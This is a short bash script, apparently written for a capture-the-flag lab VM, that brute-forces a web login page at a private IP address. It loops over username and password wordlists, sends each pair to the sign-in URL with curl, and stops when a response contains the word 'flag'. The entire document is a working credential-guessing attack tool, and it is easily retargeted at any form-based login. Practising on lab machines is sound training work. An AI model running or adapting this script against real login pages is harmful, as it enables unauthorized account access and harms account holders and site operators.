#!/bin/bash

# URL of the login page
url="http://192.168.56.101/index.php?page=signin"

# Check if the wordlists are available
if [[ ! -f usernames.txt ]] || [[ ! -f passwords.txt ]]; then
  echo "Error: usernames.txt or passwords.txt not found!"
  exit 1
fi

echo "Brute forcing the login page at: $url"

# Loop through each username from the usernames.txt file
while read -r username; do

  # Loop through each password from the passwords.txt file
  while read -r password; do

    # Send the POST request using curl
	response=$(curl -s -X POST "$url&username=${username}&password=${password}&Login=Login")

	echo "Trying Username: $username and Password: $password"

    # Check if the response contains the word "flag" (or adjust according to the actual success condition)
    if [[ $response == *"flag"* ]]; then
      echo "[+] Successful login with Username: $username and Password: $password"
      echo "[+] Flag found in the response: $(echo "$response" | grep 'flag')"
      exit 0  # Exit after a successful login to avoid unnecessary brute forcing
    else
      echo "[-] Failed login with Username: $username and Password: $password"
    fi

  done < passwords.txt  # Read passwords from file

done < usernames.txt  # Read usernames from file

echo "Brute force completed."
